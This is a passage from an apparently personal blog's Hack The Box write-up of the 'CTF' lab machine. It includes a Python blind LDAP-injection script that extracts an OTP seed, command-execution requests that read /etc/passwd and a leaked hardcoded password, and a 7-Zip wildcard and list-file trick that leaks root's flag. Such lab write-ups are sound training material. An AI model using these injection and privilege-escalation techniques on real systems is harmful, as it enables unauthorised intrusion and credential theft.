    <h4 id="send_payload--to-send-the-injection-payload-and-receive-the-response"><code class="highlighter-rouge">send_payload</code>  (to send the injection payload and receive the response)</h4>
  </li>
  <li>
    <h4 id="check_response-to-check-whether-the-response-contains-cannot-login-or-not"><code class="highlighter-rouge">check_response</code> (to check whether the response contains “Cannot login” or not)</h4>
  </li>
  <li>
    <h4 id="exploit--this-function-creates-a-list-of-numbers-from-0-to-9-then-by-looping-through-that-list-it-creates-the-payload-which-is--2a2928uid3d2a2929287c28pager3d--token--number--2a-encoded-only-once-because-python-requests-automatically-encodes-post-data-then-it-calls-send_payload-and-check_response-if-check_response-returned-true-it-adds-the-valid-number-to-the-token"><code class="highlighter-rouge">exploit</code> : This function creates a list of numbers from 0 to 9, then by looping through that list it creates the payload which is : <code class="highlighter-rouge">%2A%29%28uid%3D%2A%29%29%28%7C%28pager%3D</code> + token + number + <code class="highlighter-rouge">%2A</code> (encoded only once because python requests automatically encodes POST data). Then it calls <code class="highlighter-rouge">send_payload</code> and <code class="highlighter-rouge">check_response</code>, if <code class="highlighter-rouge">check_response</code> returned <code class="highlighter-rouge">True</code> it adds the valid number to the token.</h4>
  </li>
</ul>

<p><br /></p>

<h4 id="then-i-wrote-a-while-loop-to-keep-calling-exploit-as-long-as-lentoken-is-not-81">Then I wrote a <code class="highlighter-rouge">while</code> loop to keep calling <code class="highlighter-rouge">exploit()</code> as long as <code class="highlighter-rouge">len(token)</code> is not 81</h4>
<p><br /></p>
<h4 id="extract_tokenpy-"><code class="highlighter-rouge">extract_token.py</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">YELLOW</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[93m"</span>
<span class="n">GREEN</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m"</span>

<span class="k">def</span> <span class="nf">send_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
	<span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"inputUsername"</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span><span class="s">"inputOTP"</span><span class="p">:</span><span class="s">"0000"</span><span class="p">}</span>
	<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://10.10.10.122/login.php"</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
	<span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
	<span class="k">return</span> <span class="n">response</span>

<span class="k">def</span> <span class="nf">check_response</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
	<span class="k">if</span> <span class="s">"Cannot login"</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
		<span class="k">return</span> <span class="bp">True</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">token</span>
	<span class="n">n_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">n</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">)]</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">n_list</span><span class="p">:</span>
		<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">%2</span><span class="s">A</span><span class="si">%29%28</span><span class="s">uid</span><span class="si">%3</span><span class="s">D</span><span class="si">%2</span><span class="s">A</span><span class="si">%29%29%28%7</span><span class="s">C</span><span class="si">%28</span><span class="s">pager</span><span class="si">%3</span><span class="s">D{}{}</span><span class="si">%2</span><span class="s">A"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
		<span class="n">response</span> <span class="o">=</span> <span class="n">send_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">check_response</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
			<span class="n">token</span><span class="o">+=</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">token</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[*] Extracting Token"</span><span class="p">)</span>
<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">81</span><span class="p">:</span>
	<span class="n">exploit</span><span class="p">()</span>
	<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span> <span class="o">+</span> <span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[*] Status : "</span> <span class="o">+</span> <span class="n">token</span><span class="p">)</span>
	<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
<span class="k">else</span> <span class="p">:</span>
	<span class="k">print</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">[!] Done !"</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[*] Token : "</span> <span class="o">+</span> <span class="n">token</span><span class="p">)</span>
</code></pre></div></div>
<p><br />
<img src="/images/hackthebox/ctf/8.gif" alt="" /></p>
<h4 id="it-took-some-minutes-to-finish-and-now-we-have-the-token-">It took some minutes to finish and now we have the token :</h4>
<p><img src="/images/hackthebox/ctf/9.png" alt="" /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>285449490011357156531651545652335570713167411445727140604172141456711102716717000
</code></pre></div></div>
<h4 id="i-installed-stoken-apt-get-install-stoken-then-i-imported-the-token-">I installed <a href="https://github.com/cernekee/stoken"><code class="highlighter-rouge">stoken</code></a> (<code class="highlighter-rouge">apt-get install stoken</code>), Then I imported the token :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stoken import --token 285449490011357156531651545652335570713167411445727140604172141456711102716717000
</code></pre></div></div>
<p><img src="/images/hackthebox/ctf/10.png" alt="" /></p>
<h4 id="i-didnt-type-any-password-i-left-it-blank-we-can-either-use-the-cli-or-the-gui-for-the-cli-you-have-to-start-stoken-and-enter-the-pin-then-you-will-get-the-otp-and-for-another-otp-youll-need-to-start-stoken-again">I didn’t type any password I left it blank. We can either use the <code class="highlighter-rouge">cli</code> or the <code class="highlighter-rouge">gui</code>, for the <code class="highlighter-rouge">cli</code> you have to start <code class="highlighter-rouge">stoken</code> and enter the pin then you will get the <code class="highlighter-rouge">OTP</code>, and for another <code class="highlighter-rouge">OTP</code> you’ll need to start <code class="highlighter-rouge">stoken</code> again.</h4>
<p><img src="/images/hackthebox/ctf/11.png" alt="" /></p>
<h4 id="so-i-just-used-the-gui-as-its-better-">So I just used the <code class="highlighter-rouge">gui</code> as it’s better :</h4>
<p><img src="/images/hackthebox/ctf/12.png" alt="" /></p>
<hr />

<h3 id="rce-user-flag">RCE, User Flag</h3>
<h4 id="lets-login-and-see-whats-there-">Let’s login and see what’s there :</h4>
<p><img src="/images/hackthebox/ctf/13.png" alt="" /></p>
<h4 id="2a2928uid3d2a2929287c28uid3d2a-is-uiduid-url-encoded"><code class="highlighter-rouge">%2a%29%28uid%3d%2a%29%29%28%7c%28uid%3d%2a</code> is <code class="highlighter-rouge">*)(uid=*))(|(uid=*</code> url-encoded.</h4>
<h4 id="it-redirected-me-to-pagephp-which-i-can-use-to-execute-commands-">It redirected me to <code class="highlighter-rouge">/page.php</code> which I can use to execute commands :</h4>
<p><img src="/images/hackthebox/ctf/14.png" alt="" /></p>
<h4 id="i-tried-whoami-and-it-worked-fine">I tried <code class="highlighter-rouge">whoami</code> and it worked fine:</h4>
<p><img src="/images/hackthebox/ctf/15.png" alt="" /></p>
<h4 id="i-switched-to-burp-to-make-things-easier-i-wanted-to-read-etcpasswd-to-know-the-users-">I switched to burp to make things easier, I wanted to read <code class="highlighter-rouge">/etc/passwd</code> to know the users :</h4>
<h4 id="request--1">Request :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /page.php HTTP/1.1
Host: ctf.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ctf.htb/page.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Cookie: PHPSESSID=jj0dlekfhl2pggbo50bg4dkeu0
Connection: close
Upgrade-Insecure-Requests: 1

inputCmd=cat /etc/passwd&amp;inputOTP=52447058

</code></pre></div></div>
<h4 id="response--1">Response :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Date: Fri, 19 Jul 2019 21:58:13 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
X-Powered-By: PHP/5.4.16
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 4005
Connection: close
Content-Type: text/html; charset=UTF-8

<span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;head&gt;</span>
        ----------------
         Removed Output
        ----------------
<span class="nt">&lt;pre&gt;</span>root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
libstoragemgmt:x:998:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
chrony:x:997:995::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
ldap:x:55:55:OpenLDAP server:/var/lib/ldap:/sbin/nologin
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
ldapuser:x:1000:1000::/home/ldapuser:/bin/bash
<span class="nt">&lt;/pre&gt;</span>
        ----------------
         Removed Output
        ----------------
</code></pre></div></div>
<h4 id="we-can-see-that-ldapuser-is-an-actual-user-on-the-box-i-tried-to-get-a-reverse-shell-but-for-some-reason-i-couldnt-get-a-reverse-shell-at-all-so-i-started-to-look-in-the-web-files-i-was-already-in-the-web-directory-">We can see that <code class="highlighter-rouge">ldapuser</code> is an actual user on the box, I tried to get a reverse shell but for some reason I couldn’t get a reverse shell at all so I started to look in the web files. I was already in the web directory :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inputCmd=pwd&amp;inputOTP=14546713

/var/www/html
</code></pre></div></div>
<h4 id="i-listed-the-files-">I listed the files :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inputCmd=ls -la&amp;inputOTP=14546713

total 36
drwxr-xr-x. 6 root   root    176 Oct 23  2018 .
drwxr-xr-x. 4 root   root     33 Jun 27  2018 ..
-rw-r--r--. 1 root   root      0 Jul 20 00:03 banned.txt
-rw-r-----. 1 root   apache 1424 Oct 23  2018 cover.css
drwxr-x--x. 2 root   apache 4096 Oct 23  2018 css
drwxr-x--x. 4 root   apache   27 Oct 23  2018 dist
-rw-r-----. 1 root   apache 2592 Oct 23  2018 index.html
drwxr-x--x. 2 root   apache  242 Oct 23  2018 js
-rw-r-----. 1 root   apache 5021 Oct 23  2018 login.php
-rw-r-----. 1 root   apache   68 Oct 23  2018 logout.php
-rw-r-----. 1 root   apache 5245 Oct 23  2018 page.php
-rw-r-----. 1 root   apache 2324 Oct 23  2018 status.php
drwxr-x--x. 2 apache apache    6 Oct 23  2018 uploads
</code></pre></div></div>
<h4 id="i-started-looking-for-any-hardcoded-credentials-in-the-php-files-in-loginphp-i-found-credentials-for-ldapuser-">I started looking for any hardcoded credentials in the <code class="highlighter-rouge">php</code> files, in <code class="highlighter-rouge">login.php</code> I found credentials for <code class="highlighter-rouge">ldapuser</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inputCmd=cat login.php&amp;inputOTP=04181897

&lt;?php
session_start();
$strErrorMsg="";

$username = 'ldapuser';
$password = 'e398e27d5c4ad45086fe431120932a01';

$basedn = 'dc=ctf,dc=htb';
$usersdn = 'cn=users';

// This code uses the START_TLS command

$ldaphost = "ldap://ctf.htb";
$ldapUsername  = "cn=$username";

$ds = ldap_connect($ldaphost);
$dn = "uid=ldapuser,ou=People,dc=ctf,dc=htb";

if (!empty($_POST))
{
    //var_dump($_POST);
    $username1 = $_POST['inputUsername'];
    $OPT1 = $_POST['inputOTP'];

    $regex='/[()*&amp;|!=&gt;&lt;~]/';

    if (!preg_match($regex, $username1)) {
        $username2 = urldecode($username1);

        if(!ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, 3)){
            print "Could not set LDAPv3\r\n";
        }
        else if (!ldap_start_tls($ds)) {
           print "Could not start secure TLS connection";
        }
        else {
            // now we need to bind to the ldap server
            $bth = ldap_bind($ds, $dn, $password) or die("\r\nCould not connect to LDAP server\r\n");

            $filter = "(&amp;(objectClass=inetOrgPerson)(uid=$username2))";
            // fix to be sure that the user has a token string in the db. Without it you can bypass the OTP check with no token in the input form!
            $filter = "(&amp;(&amp;(objectClass=inetOrgPerson)(uid=$username2))(pager=*))";
            //echo $filter.PHP_EOL;
            if ($search=@ldap_search($ds, $basedn, $filter)) {
                $info = ldap_get_entries($ds, $search);

                if($info["count"] &gt; 0) {
                    $token_string = $info[0]['pager'][0];
                    //echo $token_string;
                    $token = exec("/usr/bin/stoken --token=$token_string --pin=0000");
                    if($token == $OPT1) {
                        $strErrorMsg = "Login ok";
                        $_SESSION['username'] = $username1;
                        header ('Location: /page.php');
                    }
                    else {
                        $strErrorMsg = "Cannot login";
                    }
                }
                else {
                    $strErrorMsg = "User $username1 not found";
                }
            }
        }
    }
}
?&gt;
</code></pre></div></div>
<h4 id="-ldapuser--e398e27d5c4ad45086fe431120932a01"><code class="highlighter-rouge"> ldapuser : e398e27d5c4ad45086fe431120932a01</code></h4>
<h4 id="ssh-"><code class="highlighter-rouge">ssh</code> :</h4>
<p><img src="/images/hackthebox/ctf/16.png" alt="" /></p>
<h4 id="we-owned-user">We owned user.</h4>
<p><br /></p>
<hr />

<h3 id="7z-list-files-and-wildcards-root-flag">7z List Files and Wildcards, Root Flag</h3>
<h4 id="before-enumerating-anything-i-just-checked-the-directories-and-stuff-like-that-in--i-saw-a-directory-called-backup">Before enumerating anything I just checked the directories and stuff like that, in <code class="highlighter-rouge">/</code> I saw a directory called <code class="highlighter-rouge">backup</code></h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ldapuser@ctf /]$ ls -al
total 32
dr-xr-xr-x.  18 root root  238 Jul 31  2018 .
dr-xr-xr-x.  18 root root  238 Jul 31  2018 ..
drwxr-xr-x.   2 root root 4096 Jul 20 00:07 backup
lrwxrwxrwx.   1 root root    7 Jul 30  2018 bin -&gt; usr/bin
dr-xr-xr-x.   5 root root 4096 Oct 16  2018 boot
drwxr-xr-x.  20 root root 3180 Jul 19 23:34 dev
drwxr-xr-x.  90 root root 8192 Dec  9  2018 etc
drwxr-xr-x.   3 root root   22 Jul 30  2018 home
lrwxrwxrwx.   1 root root    7 Jul 30  2018 lib -&gt; usr/lib
lrwxrwxrwx.   1 root root    9 Jul 30  2018 lib64 -&gt; usr/lib64
drwxr-xr-x.   2 root root    6 Apr 11  2018 media
drwxr-xr-x.   2 root root    6 Apr 11  2018 mnt
drwxr-xr-x.   3 root root   16 Jul 30  2018 opt
dr-xr-xr-x. 119 root root    0 Jul 19 23:33 proc
dr-xr-x---.   7 root root 4096 Dec  9  2018 root
drwxr-xr-x.  31 root root  920 Jul 19 23:34 run
lrwxrwxrwx.   1 root root    8 Jul 30  2018 sbin -&gt; usr/sbin
drwxr-xr-x.   2 root root    6 Apr 11  2018 srv
dr-xr-xr-x.  13 root root    0 Jul 19 23:34 sys
drwxrwxrwt.  10 root root 4096 Jul 20 00:06 tmp
drwxr-xr-x.  13 root root  155 Jul 30  2018 usr
drwxr-xr-x.  21 root root 4096 Jul 30  2018 var
[ldapuser@ctf /]$ 
</code></pre></div></div>
<h4 id="it-had-a-lot-of-archives-an-error-log-and-a-script-called-honeypotsh-">It had a lot of archives, an error log and a script called <code class="highlighter-rouge">honeypot.sh</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ldapuser@ctf backup]$ ls -al
total 52
drwxr-xr-x.  2 root root 4096 Jul 20 00:07 .
dr-xr-xr-x. 18 root root  238 Jul 31  2018 ..
-rw-r--r--.  1 root root   32 Jul 19 23:57 backup.1563573421.zip
-rw-r--r--.  1 root root   32 Jul 19 23:58 backup.1563573481.zip
-rw-r--r--.  1 root root   32 Jul 19 23:59 backup.1563573541.zip
-rw-r--r--.  1 root root   32 Jul 20 00:00 backup.1563573602.zip
-rw-r--r--.  1 root root   32 Jul 20 00:01 backup.1563573661.zip
-rw-r--r--.  1 root root   32 Jul 20 00:02 backup.1563573721.zip
-rw-r--r--.  1 root root   32 Jul 20 00:03 backup.1563573781.zip
-rw-r--r--.  1 root root   32 Jul 20 00:04 backup.1563573841.zip
-rw-r--r--.  1 root root   32 Jul 20 00:05 backup.1563573901.zip
-rw-r--r--.  1 root root   32 Jul 20 00:06 backup.1563573961.zip
-rw-r--r--.  1 root root   32 Jul 20 00:07 backup.1563574022.zip
-rw-r--r--.  1 root root    0 Jul 20 00:07 error.log
-rwxr--r--.  1 root root  975 Oct 23  2018 honeypot.sh
[ldapuser@ctf backup]$ 
</code></pre></div></div>
<h4 id="honeypotsh-"><code class="highlighter-rouge">honeypot.sh</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ldapuser@ctf backup]$ cat honeypot.sh 
# get banned ips from fail2ban jails and update banned.txt
# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)
/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u &gt; /var/www/html/banned.txt
# awk '$1=$1' ORS='&lt;br&gt;' /var/www/html/banned.txt &gt; /var/www/html/testfile.tmp &amp;&amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt

# some vars in order to be sure that backups are protected
now=$(date +"%s")
filename="backup.$now"
pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')

# keep only last 10 backups
cd /backup
ls -1t *.zip | tail -n +11 | xargs rm -f

# get the files from the honeypot and backup 'em all
cd /var/www/html/uploads
7za a /backup/$filename.zip -t7z -snl -p$pass -- *

# cleaup the honeypot
rm -rf -- *

# comment the next line to get errors for debugging
truncate -s 0 /backup/error.log
[ldapuser@ctf backup]$ 
</code></pre></div></div>
<h4 id="obviously-this-script-runs-from-time-to-time-to-backup-files-also-its-running-as-root-i-didnt-check-cronjobs-or-use-pspy-it-was-obvious-since-its-accessing-rootroottxt-to-create-the-password-and-only-root-can-access-that">Obviously this script runs from time to time to backup files, also it’s running as root. I didn’t check cronjobs or use <code class="highlighter-rouge">pspy</code>, it was obvious since it’s accessing <code class="highlighter-rouge">/root/root.txt</code> to create the password and only root can access that.</h4>
<h4 id="basically-one-of-the-things-that-this-script-is-doing-is-that-its-backing-up-all-the-files-in-varwwwhtmluploads-by-using-7za-to-put-all-the-uploads-in-one-archive-lets-look-at-the-command-again-">Basically one of the things that this script is doing is that it’s backing up all the files in <code class="highlighter-rouge">/var/www/html/uploads</code> by using <code class="highlighter-rouge">7za</code> to put all the uploads in one archive. Let’s look at the command again :</h4>
<p><code class="highlighter-rouge">7za a /backup/$filename.zip -t7z -snl -p$pass -- *</code></p>
<h4 id="its-using-the-wildcard-asterisk--to-get-all-files-this-means-that-if-we-can-write-to-varwwwhtmluploads-our-file-will-be-included-in-the-command-if-we-can-create-a-malicious-file-name-then-we-can-somehow-manipulate-the-7za-command">It’s using the wildcard asterisk (<code class="highlighter-rouge">*</code>) to get all files. This means that if we can write to <code class="highlighter-rouge">/var/www/html/uploads</code> our file will be included in the command. If we can create a malicious file name then we can somehow manipulate the <code class="highlighter-rouge">7za</code> command.</h4>
<h4 id="its-also-using-this-option---snl-i-checked-the-manual-page-for-7za-">It’s also using this option : <code class="highlighter-rouge">-snl</code>, I checked the manual page for <code class="highlighter-rouge">7za</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>       -snl   Store symbolic links as links
</code></pre></div></div>
<h4 id="note-that-we-cant-unzip-the-created-backups-so-even-if-we-created-a-symlink-to-roottxt-in-varwwwhtmluploads-we-wont-be-able-to-read-it-because-the-archive-is-password-protected-the-only-way-to-actually-get-anything-is-through-the-error-log-we-need-to-cause-an-error-that-somehow-leaks-the-flag">Note that we can’t unzip the created backups, so even if we created a symlink to <code class="highlighter-rouge">root.txt</code> in <code class="highlighter-rouge">/var/www/html/uploads</code> we won’t be able to read it because the archive is password protected. The only way to actually get anything is through the error log, we need to cause an error that somehow leaks the flag.</h4>
<h4 id="after-searching-for-some-time-i-found-this-page-which-talks-about-a-feature-in-7z-called-list-files-i-thought-if-i-created-2-files-roottxt-and-roottxt-roottxt-is-a-symlink-to-rootroottxt-when-the-command-is-executed-and-gets-to-roottxt-it-will-treat-that-as-a-list-file-option-then-it-will-search-for-roottxt-to-use-it-as-a-list-file-however-that-file-isnt-a-real-list-file-that-may-cause-an-error-also-its-a-symlink-to-rootroottxt">After searching for some time I found <a href="https://sevenzip.osdn.jp/chm/cmdline/syntax.htm">this page</a> which talks about a feature in <code class="highlighter-rouge">7z</code> called list files. I thought if I created 2 files, <code class="highlighter-rouge">root.txt</code> and <code class="highlighter-rouge">@root.txt</code>, <code class="highlighter-rouge">root.txt</code> is a <code class="highlighter-rouge">symlink</code> to <code class="highlighter-rouge">/root/root.txt</code>, when the command is executed and gets to <code class="highlighter-rouge">@root.txt</code> it will treat that as a list file option then it will search for <code class="highlighter-rouge">root.txt</code> to use it as a list file. However that file isn’t a real list file (that may cause an error), also it’s a <code class="highlighter-rouge">symlink</code> to <code class="highlighter-rouge">/root/root.txt</code>.</h4>
<h4 id="i-went-to-varwwwhtmluploads-and-i-didnt-even-have-read-access">I went to <code class="highlighter-rouge">/var/www/html/uploads</code> and I didn’t even have read access.</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ldapuser@ctf backup]$ cd /var/www/html/uploads/
[ldapuser@ctf uploads]$ ls -al
ls: cannot open directory .: Permission denied
[ldapuser@ctf uploads]$ 
</code></pre></div></div>
<h4 id="so-i-went-back-to-the-rce-requests-in-burp-and-tried-as-apache">so I went back to the <code class="highlighter-rouge">RCE</code> requests in burp and tried as <code class="highlighter-rouge">apache</code>.</h4>
<h4 id="i-created-a-symlink-to-rootroottxt-as-roottxt-">I created a <code class="highlighter-rouge">symlink</code> to <code class="highlighter-rouge">/root/root.txt</code> as <code class="highlighter-rouge">root.txt</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inputCmd=ln -s /root/root.txt uploads/root.txt&amp;inputOTP=91913130
</code></pre></div></div>
<h4 id="then-i-created-an-empty-file-and-called-it-roottxt-">Then I created an empty file and called it <code class="highlighter-rouge">@root.txt</code> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inputCmd=touch uploads/@root.txt&amp;inputOTP=91913130
</code></pre></div></div>
<h4 id="lets-check-the-directory-listing-now-">Let’s check the directory listing now :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inputCmd=ls -la uploads&amp;inputOTP=91913130

total 0
drwxr-x--x. 2 apache apache  39 Jul 20 01:12 .
drwxr-xr-x. 6 root   root   176 Oct 23  2018 ..
-rw-r--r--. 1 apache apache   0 Jul 20 01:12 @root.txt
lrwxrwxrwx. 1 apache apache  14 Jul 20 01:12 root.txt -&gt; /root/root.txt
</code></pre></div></div>
<h4 id="everything-is-fine-lets-check-the-error-log-">Everything is fine let’s check the error log :</h4>
<p><img src="/images/hackthebox/ctf/17.png" alt="" /></p>
<h4 id="and-we-owned-root-">And we owned root !</h4>
<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
<h4 id="thanks-for-reading">Thanks for reading.</h4>
<p><br />
<br /></p>
<h4 id="previous-hack-the-box-write-up--hack-the-box---friendzone">Previous Hack The Box write-up : <a href="/hack-the-box/friendzone/">Hack The Box - Friendzone</a></h4>
<hr />


  </div>
<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/ctf/" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">0xRick Owned Root !</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">0xRick Owned Root !</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>

